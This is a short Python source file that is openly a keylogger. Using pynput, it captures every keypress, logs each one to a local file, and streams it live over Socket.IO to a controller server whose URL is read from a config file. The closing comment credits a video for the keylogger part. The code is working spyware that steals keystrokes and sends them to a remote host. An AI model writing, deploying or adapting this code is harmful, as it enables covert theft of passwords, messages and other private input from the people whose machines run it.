from pynput.keyboard import Key, Listener 
import logging 
import json
import socketio 

with open('lib.json') as config_file:
    data = json.load(config_file)

print(data['controllerServerURL'])
sio = socketio.Client(logger=False)

sio.connect(data['controllerServerURL'], wait_timeout = 10)


@sio.event
def connect():
    print("I'm connected!")

@sio.event
def connect_error(data):
    print("The connection failed!")

@sio.event
def disconnect():
    print("I'm disconnected!")


log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level= logging.DEBUG, format='%(asctime)s %(message)s')

def on_press(key):
    sio.emit("logger",str(key))
    try:
        logging.info(key)
    except FileExistsError:
        pass



with Listener(on_press=on_press) as listener:
    listener.join()


# source of the keylogger part: https://www.youtube.com/watch?v=yvHrNlAF0Y0